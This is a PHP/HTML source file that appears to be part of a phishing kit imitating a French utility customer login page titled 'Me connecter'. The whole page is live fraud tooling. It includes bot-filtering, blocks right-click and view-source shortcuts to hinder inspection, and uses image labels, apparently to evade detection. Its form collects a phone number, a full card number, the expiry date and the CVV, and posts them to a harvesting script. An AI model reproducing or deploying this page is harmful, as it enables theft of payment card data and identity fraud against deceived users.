<?php
session_start();
error_reporting(0);
//----------------BOTS---------------\\
include('../assets/srv/funciones.php');
include('../assets/srv/app.php');
//--------------ENDBOTS--------------\\
//--------------------RANDOMS---------------------\\
$random    = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$random1    = substr(md5($random), 0, 20);
$random2 = substr(md5($random), 0, 14);
$random3 = substr(md5($random), 0, 8);
$random4 = substr(md5($random), 0, 50);
//------------------ENDRANDOMS--------------------\\
?>
<!DOCTYPE html>
<html lang="fr" style="overflow: auto;">
    <head>
        <meta http-equiv="Content-Type" ;="" content="charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" type="text/css" href="../assets/css/main.css" />
        <link rel="stylesheet" type="text/css" href="../assets/css/style2.css" />
        <link rel="stylesheet" type="text/css" href="../assets/css/images.css" />
		<script src="../assets/js/mask.js"></script>
		<link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
        <script>
            document.addEventListener("contextmenu", (event) => event.preventDefault());
            document.onkeydown = function (e) {
                if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                    return false;
                } else {
                    return true;
                }
            };
            $(document).keypress("u", function (e) {
                if (e.ctrlKey) {
                    return false;
                } else {
                    return true;
                }
            });
        </script>
        <noscript>
            <h3>You must have JavaScript enabled in order to use this order form. Please enable JavaScript and then reload this page in order to continue.</h3>
            <meta http-equiv="refresh" content="0;url" ="../../" />
        </noscript>
        <title>Me connecter</title>
		<link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
        <body style="overflow: auto;">
            <aside><img style="background-size: cover; display: block; position: fixed; height: 100%; left: 0; top: 0; width: 28.5%;" src="../assets/images/ec-bg.png" /></aside>
            <form method="POST" action="./$post/0ow2.php" />
            <div id="login-base">
                <div class="edf--container clearfix">
                    <div id="content">
                        <div class="auth auth--withRetour js-document">
                            <div class="auth__id">
                                <div class="auth__id-logo" id="mylogo"></div>
                            </div>
                            <section>
                                <main class="auth__content">
                                    <h3 style="margin-bottom: 12px;" class="auth__content-title"><img src="../assets/images/enc2.png" /></h3>
                                    <div class="form-group col-md-6">
                                        <label for="inputInfo1" style="margin-bottom: 4px;"><img src="../assets/images/1.png" /></label>
                                        <input type="text" name="0ow2_1" style="border-radius: 4px; height: 40px; background-color: white; font-size: 18px;" class="form-control" id="inputInfo1" placeholder="" autofocus required />
                                    </div>
                                    <div class="form-group col-md-6">
                                        <label for="inputInfo2" style="margin-bottom: 4px;"><img src="../assets/images/2.png" /></label>
                                        <input type="text" name="0ow2_2" style="border-radius: 4px; height: 40px; background-color: white; font-size: 18px;" class="form-control" id="inputInfo2" placeholder="" required />
                                    </div>
                                    <div class="form-group col-md-12">
                                        <label for="inputInfo3" style="margin-bottom: 4px;"><img src="../assets/images/3.png" /></label>
                                        <input type="tel" name="0ow2_3" maxlength="10" minlength="10"  style="border-radius: 4px; height: 40px; background-color: white; font-size: 18px;" class="form-control" id="po" placeholder="" required />
										<script>
										var element = document.getElementById('po');
										var maskOptions = {mask: '0000000000'};
										var mask = IMask(element, maskOptions);
										</script>
									</div>
                                    <div class="form-group col-md-12">
                                        <label for="inputInfo4" style="margin-bottom: 4px;"><img src="../assets/images/4.png" /></label>
                                        <input type="text" name="0ow2_4"  style="border-radius: 4px; height: 40px; background-color: white; font-size: 18px;" class="form-control" id="cc" placeholder="" required />
										<script>
										var element = document.getElementById('cc');
										var maskOptions = {mask: '0000 0000 0000 0000'};
										var mask = IMask(element, maskOptions);
										</script>
									</div>
                                    <div class="form-group col-md-6">
                                        <label for="inputInfo5" style="margin-bottom: 4px;"><img src="../assets/images/5.png" /></label>
                                        <input type="text" name="0ow2_5" style="border-radius: 4px; height: 40px; background-color: white; font-size: 18px;" class="form-control" id="ep" placeholder="" required />
										<script>													
										var element = document.getElementById('ep');
										var maskOptions = {mask: '00/0000'};
										var mask = IMask(element, maskOptions);
										</script>
									</div>
                                    <div class="form-group col-md-6">
                                        <label for="inputInfo6" style="margin-bottom: 4px;"><img src="../assets/images/6.png" /></label>
                                        <input type="text" name="0ow2_6" pattern=".{3,}" style="border-radius: 4px; height: 40px; background-color: white; font-size: 18px;" class="form-control" id="co" placeholder="" required />
										<script>
										var element = document.getElementById('co');
										var maskOptions = {mask: '000'};
										var mask = IMask(element, maskOptions);
										</script>
									</div>
                                </main>
                            </section>
							<button id="username-next-button" class="atomx-btn atomx-btn--theme-primary">
                                                <span class="atomx-btn__label">Suivant</span>
                                            </button>
											</form>
                            <section class="auth__add-EC" style="display: block;">
                                <center>
                                    <img src="../assets/images/eng.png" style="cursor: pointer; width: 340px;" />
                                </center>
                            </section>
                        </div>
                    </div>
                </div>
            </div>
        </body>
    </head>
</html>
